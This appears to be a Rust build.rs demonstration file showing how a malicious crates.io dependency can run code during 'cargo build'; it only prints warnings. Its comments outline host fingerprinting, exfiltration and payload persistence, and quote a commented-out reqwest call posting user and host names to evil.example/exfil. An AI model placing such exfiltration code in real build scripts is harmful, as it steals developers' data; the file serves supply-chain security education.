// Demonstration ONLY — this is what a malicious build.rs in a
// crates.io dependency looks like. The real attacks of 2025–2026
// (faster_log, async_println, evm-units, CVE-2026-28353) used
// scripts shaped exactly like this:
//
//   1. Read whoami / hostname / env vars to fingerprint the host.
//   2. Exfiltrate to an attacker-controlled URL via reqwest /
//      ureq / curl (whichever the malicious crate could pull in).
//   3. Optionally drop a persistent payload in ~/.cargo/bin or
//      /usr/local/bin.
//
// All of the above runs *as the user invoking `cargo build`*, with
// the same filesystem and network privileges, before a single line
// of the user's code has been compiled. There is no pre-flight
// confirmation, no review prompt, no opt-out. The user accepted
// arbitrary code execution by typing `cargo build`.
//
// This file does NOT actually exfiltrate. It only prints what it
// COULD do, so the demo is safe to run in any environment. To see
// the demo in action:
//
//   $ cd cargo_attack && cargo build
//
// You will see the "INSTALLED MALWARE" line in the cargo output —
// proof that the script ran with no user confirmation.

fn main() {
    // Tell cargo to actually print our message (build scripts have
    // a special prefix syntax so cargo will surface our output).
    println!("cargo:warning=========================================");
    println!("cargo:warning= INSTALLED MALWARE (DEMO — see build.rs)");
    println!("cargo:warning= A real attacker here could read every");
    println!("cargo:warning= file your user account can touch, open");
    println!("cargo:warning= an outbound connection, drop a binary");
    println!("cargo:warning= in ~/.cargo/bin, etc.");
    println!("cargo:warning=========================================");

    // The real attack patterns from 2025 used these primitives:
    //
    //   let user = std::env::var("USER").unwrap_or_default();
    //   let host = std::process::Command::new("hostname").output()...;
    //   let _ = reqwest::blocking::Client::new()
    //       .post("https://evil.example/exfil")
    //       .body(format!("{user}@{host}"))
    //       .send();
    //
    // We deliberately do not execute any of those calls here. The
    // existence of this file in a crates.io dependency was enough
    // — your `cargo build` ran arbitrary code we wrote, and the
    // attacker has unlimited execution from this point.
}
